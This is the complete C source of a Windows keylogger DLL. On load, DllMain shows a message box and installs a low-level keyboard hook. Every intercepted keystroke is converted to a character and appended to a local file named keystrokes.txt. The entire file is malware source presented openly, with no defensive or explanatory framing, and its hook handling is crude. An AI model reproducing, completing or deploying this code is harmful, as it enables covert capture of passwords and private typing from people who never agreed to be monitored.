#include "keylogger.h"
BOOL runThread = TRUE;
HHOOK hookHandle = NULL;
MSG msg;

HOOKPROC ProcessKeystroke(int code, WPARAM wParam, LPARAM lParam){
    DWORD virtualKeyCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
    FILE *filePointer = fopen("keystrokes.txt", "a+");
    if (filePointer != NULL){
        fprintf(filePointer, "%c", MapVirtualKeyA(virtualKeyCode, MAPVK_VK_TO_CHAR));
        fclose(filePointer);
    }
    return 0;
}

LPTHREAD_START_ROUTINE Keylogger(){
    printf("Keylogging started... tracking keystrokes");
    hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL,  (HOOKPROC) ProcessKeystroke, NULL, 0);
    if (hookHandle == NULL){
        printf("Failed to install hook handle.");
        return  (LPTHREAD_START_ROUTINE) 1;
    }
    while (GetMessage( &msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (LPTHREAD_START_ROUTINE) 0;
}

int DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        MessageBoxA(
            NULL,
            "DLL Loaded",
            "Success",
            MB_OK
        );
    }
    printf("Attempting to track key strokes!");
    Keylogger();
    return 0;
}